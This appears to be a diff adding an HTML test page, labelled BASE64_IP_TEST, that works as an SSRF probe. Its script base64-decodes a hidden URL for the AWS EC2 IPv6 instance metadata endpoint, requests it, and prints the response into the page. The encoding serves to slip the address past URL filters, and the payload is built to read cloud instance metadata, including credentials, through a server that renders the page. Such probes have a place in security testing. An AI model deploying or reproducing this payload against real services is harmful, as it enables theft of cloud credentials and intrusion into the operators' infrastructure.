@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head><title>Base64 IP</title></head>
+<body>
+<h1>BASE64_IP_TEST</h1>
+<div id="r1">LOADING</div>
+<script>
+// "http://[fd00:ec2::254]/latest/meta-data/" in base64
+var url = atob('aHR0cDovL1tmZDAwOmVjMjo6MjU0XS9sYXRlc3QvbWV0YS1kYXRhLw==');
+try {
+  var xhr = new XMLHttpRequest();
+  xhr.open('GET', url, false);
+  xhr.send();
+  document.getElementById('r1').innerText = 'STATUS:' + xhr.status + ' BODY:' + xhr.responseText.substr(0,2000);
+} catch(e) {
+  document.getElementById('r1').innerText = 'ERROR:' + e.name + ':' + e.message;
+}
+</script>
+</body>
+</html>
